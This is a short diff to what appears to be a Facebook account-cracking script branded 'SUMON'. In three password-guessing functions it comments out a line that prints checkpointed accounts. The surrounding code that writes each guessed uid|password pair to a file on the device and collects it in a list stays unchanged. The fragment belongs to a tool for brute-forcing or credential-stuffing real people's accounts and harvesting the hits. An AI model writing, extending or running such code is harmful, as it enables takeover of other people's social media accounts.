@@ -1437,7 +1437,7 @@ def mbasic(uid,pwx,tl):
                            oks.append(uid)
                            break
             elif "www.facebook.com" in result["error"]["message"]:
-                print(f" {red}[SUMON-CP] {uid}|{pw}")
+                #print(f" {red}[SUMON-CP] {uid}|{pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
@@ -1532,7 +1532,7 @@ def p(uid,pwx,tl):
                            oks.append(uid)
                            break
             elif "www.facebook.com" in result["error"]["message"]:
-                print(f" {red}[SUMON-CP] {uid}|{pw}")
+                #print(f" {red}[SUMON-CP] {uid}|{pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
@@ -1626,7 +1626,7 @@ def x(uid,pwx,tl):
                            oks.append(uid)
                            break
             elif "www.facebook.com" in result["error"]["message"]:
-                print(f" {red}[SUMON-CP] {uid}|{pw}")
+                #print(f" {red}[SUMON-CP] {uid}|{pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
